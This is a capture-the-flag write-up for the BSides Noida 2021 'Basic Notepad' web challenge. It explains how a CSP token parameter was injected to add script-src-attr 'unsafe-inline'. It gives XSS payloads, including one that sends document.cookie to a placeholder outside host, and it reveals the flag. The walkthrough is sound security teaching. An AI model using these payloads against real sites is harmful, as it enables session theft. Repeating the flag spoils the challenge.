---
title: "BSides Noida CTF 2021 Basic Notepad writeup"
description: "BSides Noida CTF 2021 Basic Notepad writeup"
authors: [hi120ki]
tags: [CTF, Web, Web Security]
slug: posts/20210808
---

## Challenge

```
Create a note and share with admin :eyes:
Note : Bruteforce is not required.
```

<!-- truncate -->

## Solution

This is a simple memo application, and it has a button "Share with admin", so the problem is related to XSS.

Checked the url, it has two parametrs "msg" and "token".

[http://ctf.notepad1.bsidesnoida.in/review?msg=bWVtbw&token=5ruMlXaWgLCJgsghznm9gg](http://ctf.notepad1.bsidesnoida.in/review?msg=bWVtbw&token=5ruMlXaWgLCJgsghznm9gg)

"msg" is base64 encoded memo text, and "token" is auto generated strings.

This memo text is not escaped, and we can set XSS.

But CSP is set for this memo app, and CSP report url contains "token" parameter.

```
content-security-policy: script-src 'none'; object-src 'none'; base-uri 'none'; script-src-elem 'none'; report-uri /report/5ruMlXaWgLCJgsghznm9gg
```

We can change the CSP by changing the "token" parameter.

If the csp has two directives, the later one will be ignored.

In this case, `script-src` and `script-src-elem` are already set, so we can't overwrite them.

However, there is one more csp directive related to javascript, which is `script-src-attr`.

[CSP: script-src-attr - MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src-attr)

`script-src-attr` directive specifies valid sources for JavaScript inline event handlers. This will allow inline script to be executed by event handlers like onclick.

Therefore, we can execute any javascript by putting the following values in msg and token.

`msg`

```
<img src=# onerror=alert(1)>
```

`token`

```
a; script-src-attr 'unsafe-inline';
```

> CSP will be `script-src 'none'; object-src 'none'; base-uri 'none'; script-src-elem 'none'; report-uri /report/a; script-src-attr 'unsafe-inline';`

I got the cookie by this msg.

```
<img src=# onerror='fetch("https://xxx/?cookie=" + encodeURI(document.cookie))'>
```

Flag is

```
BSNoida{s0me_b4s1c_CSP_1nj3ct10n}
```
